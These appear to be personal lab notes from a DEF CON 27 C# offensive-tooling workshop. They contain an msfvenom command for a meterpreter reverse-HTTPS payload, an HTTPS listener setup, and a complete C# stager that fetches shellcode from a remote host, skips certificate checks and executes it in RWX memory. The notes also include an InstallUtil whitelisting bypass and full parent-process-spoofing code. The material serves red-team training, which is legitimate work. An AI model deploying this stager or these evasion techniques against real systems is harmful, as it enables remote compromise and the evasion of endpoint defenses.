https://github.com/mvelazc0/defcon27_csharp_workshop

# Defcon Csharp workshop

set up one windows vm and one kali linux vm.
One kali linux:
`metasploit`
`pip install twistd`
`EmpireProject`

# lab 1

## Exercise 1

hellow world

## Exercise 2

inside cff exploreer in import directory we can see that mscore.lib is being imported

monitor with procmon

# lab 2

Downloada meterpreter stager

in network tab of process hacker we can look at network artifacts

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=Your_Kali_IP LPORT=8080
-f exe > ~/reverse.exe
```

creating an https listener

```
openssl genrsa > privkey.pem;
openssl req -new -x509 -key privkey.pem -out cert.pem -days 365;
twistd -n web -c cert.pem -k privkey.pem --https=8080;
```

using web.client we can download and execute as well

## Exercise 3

creating a custom stager

```C#
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program
{

    //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;


    public static void Main()
    {
        string url = "https://192.168.0.35:8080/nD7qcbYj8eZVilSICKHiKQ5d9UJt8wcsY3KVBWrtBEvK9mbfbWNqZ9sf1";
        Stager(url);
    }

    public static void Stager(string url)
    {

        WebClient wc = new WebClient();
        wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
        ServicePointManager.Expect100Continue = true;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

        byte[] shellcode = wc.DownloadData(url);

        UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
        IntPtr threatHandle = IntPtr.Zero;
        UInt32 threadId = 0;
        IntPtr parameter = IntPtr.Zero;
        threatHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
        WaitForSingleObject(threatHandle, 0xFFFFFFFF);

    }



}
```

# Lab 3

raw shellcod einjection

## exercise 2 

bypassing application whitelisting

```C#
using System;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;


public class Program
{
    public static void Main()
    {
        Console.WriteLine("I am not malicious :)");
        Console.ReadKey();
    }

}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        LegitInstaller.Run();
    }

}

public class LegitInstaller
{

    public static void Run()
    {
        Process.Start("notepad.exe");
        Console.ReadKey();

    }

}

```

```
C:\Users\WIN10RED\source\repos\cryptopals_net\cryptopals_net\bin\x64\Release>C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile=false /U ./cryptopals_net.exe
Microsoft (R) .NET Framework Installation utility Version 4.8.4084.0
Copyright (C) Microsoft Corporation.  All rights reserved.

Exception occurred while initializing the installation:
System.BadImageFormatException: Could not load file or assembly 'file:///C:\Users\WIN10RED\source\repos\cryptopals_net\cryptopals_net\bin\x64\Release\cryptopals_net.exe' or one of its dependencies. An attempt was made to load a program with an incorrect format..
```

# lab 4 

shellcode obfuscation

## xor the payload

## AES encryption of payload

# lab 5 powershell without powershell.exe

## Executing PWS cmdlets

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:"C:\Program Files
(x86)\Reference
Assemblies\Microsoft\WindowsPowerShell\3.0\System.Management.Automation.dll" 1.cs
```

dll not found error : https://stackoverflow.com/questions/27374767/missing-automation-from-namespace-system-management-missing-assembly-referenc#:~:text=If%20a%20DLL%20is%20not%20found%2C%20there%20is,package%20names%20have%20changed.%20Uninstall%20the%20package%20System.Management.Automation

## DLL injection

lab 6 - also shows how to search memeory

## Process Hollowing

lab 7 

## Parent process spoofing

does not work 

```C#
//https://github.com/leoloobeek/csharp/blob/master/ExecutionTesting.cs

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
using System.IO;
using System.Diagnostics;

class Program
{
    static void Main()
    {

        Console.WriteLine("Listing all processes...");
        Console.WriteLine("--------------------------------------------------------------------");

        Process[] procs = Process.GetProcesses();
        foreach (Process proc in procs)
        {
            try
            {
                Console.WriteLine("Name:" + proc.ProcessName + " Path:" + proc.MainModule.FileName + " Id:" + proc.Id);
            }
            catch
            {
                continue;
            }
        }
        Console.WriteLine("--------------------------------------------------------------------\n");
        Console.WriteLine("Enter Id:");
        int ParentProcId;
        ParentProcId = Convert.ToInt32(Console.ReadLine());
        Console.WriteLine(ParentProcId);

        string binaryPath = "C:\\Windows\\System32\\notepad.exe";

        Console.WriteLine(String.Format("Press enter to execute '{0}' under pid {1}", binaryPath, ParentProcId));
        Console.ReadKey();
        SpoofParent.Run(ParentProcId, binaryPath);
        Console.WriteLine("Done. Press any key to exit...");
        Console.ReadKey();
    }
}

class SpoofParent
{
    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 milliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetHandleInformation(IntPtr hObject, HANDLE_FLAGS dwMask, HANDLE_FLAGS dwFlags);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, ref IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

    public static bool Run(int parentProcessId, string binaryPath)
    {
        // STARTUPINFOEX members
        const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

        // STARTUPINFO members (dwFlags and wShowWindow)
        const int STARTF_USESTDHANDLES = 0x00000100;
        const int STARTF_USESHOWWINDOW = 0x00000001;
        const short SW_HIDE = 0x0000;

        // dwCreationFlags
        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        const uint CREATE_NO_WINDOW = 0x08000000;

        var pInfo = new PROCESS_INFORMATION();
        var siEx = new STARTUPINFOEX();

        //siEx.StartupInfo.cb = Marshal.SizeOf(siEx);
        IntPtr lpValueProc = IntPtr.Zero;
        IntPtr hSourceProcessHandle = IntPtr.Zero;
        var lpSize = IntPtr.Zero;

        InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
        siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
        InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, ref lpSize);

        IntPtr parentHandle = OpenProcess(ProcessAccessFlags.CreateProcess | ProcessAccessFlags.DuplicateHandle, false, parentProcessId);

        lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
        Marshal.WriteIntPtr(lpValueProc, parentHandle);

        UpdateProcThreadAttribute(siEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

        siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        siEx.StartupInfo.wShowWindow = SW_HIDE;

        var ps = new SECURITY_ATTRIBUTES();
        var ts = new SECURITY_ATTRIBUTES();
        ps.nLength = Marshal.SizeOf(ps);
        ts.nLength = Marshal.SizeOf(ts);
        bool ret = CreateProcess(binaryPath, null, ref ps, ref ts, true, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siEx, out pInfo);
        if (!ret)
        {
            Console.WriteLine("[!] Proccess failed to execute!");
            return false;
        }

        return true;


    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        [MarshalAs(UnmanagedType.Bool)]
        public bool bInheritHandle;
    }

    [Flags]
    public enum ProcessAccessFlags : uint
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }

    [Flags]
    enum HANDLE_FLAGS : uint
    {
        None = 0,
        INHERIT = 1,
        PROTECT_FROM_CLOSE = 2
    }
}
```













